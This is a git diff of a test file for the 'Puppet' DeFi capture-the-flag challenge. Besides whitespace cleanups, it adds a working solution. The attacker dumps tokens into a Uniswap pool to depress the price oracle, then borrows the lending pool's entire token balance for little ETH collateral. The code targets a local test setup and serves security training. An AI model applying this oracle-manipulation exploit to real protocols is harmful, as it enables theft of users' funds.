@@ -23,7 +23,7 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
@@ -60,7 +60,7 @@ describe('[Challenge] Puppet', function () {
             this.token.address,
             this.uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -72,7 +72,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
@@ -86,7 +86,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and attacker account
         await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
         await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -102,13 +102,24 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        this.token.connect(attacker).approve(this.uniswapExchange.address,
+                this.token.balanceOf(attacker.address));
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(
+            ethers.utils.parseEther('9.90065'), // ether wanted to bought
+            this.token.balanceOf(attacker.address), // max token given
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+            {gasLimit: 1e6});
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE,
+            {value: ethers.utils.parseEther('33')}
+        );
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
-        // Attacker has taken all tokens from the pool        
+        // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.eq('0');
